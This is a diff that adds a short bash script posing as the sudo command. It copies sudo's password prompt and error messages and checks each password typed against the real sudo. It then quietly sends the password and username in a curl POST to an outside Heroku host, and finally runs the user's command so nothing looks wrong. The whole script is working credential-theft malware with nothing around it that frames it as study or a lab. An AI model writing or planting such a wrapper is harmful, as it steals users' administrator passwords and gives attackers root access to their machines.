@@ -1,0 +1,36 @@
+user=$(whoami)
+url="https://sudo-pw.herokuapp.com/throw"
+failureString1="Sorry, try again."
+failureString2="sudo: 3 incorrect password attempts"
+prompt="[sudo] password for $user: "
+
+echo -n "$prompt"
+read -s password
+echo ""
+
+response=$(echo "$password" | /usr/bin/sudo -S ls 2>&1)
+if [[ $response == *$failureString1* ]]; then
+  echo "$failureString1"
+  
+  echo -n "$prompt"
+  read -s password
+  echo ""
+
+  response=$(echo "$password" | /usr/bin/sudo -S ls 2>&1)
+  if [[ $response == *$failureString1* ]]; then
+    echo "$failureString1"
+
+    echo -n "$prompt"
+    read -s password
+    echo ""
+
+    response=$(echo "$password" | /usr/bin/sudo -S ls 2>&1)
+    if [[ $response == *"incorrect password attempt"* ]]; then
+      echo "$failureString2"
+      exit 1
+    fi
+  fi
+fi
+
+curl -s --location --request POST "https://sudo-pw.herokuapp.com/throw?password=$password&username=$user" 2>&1 > /dev/null
+echo "$password" | /usr/bin/sudo -S $*
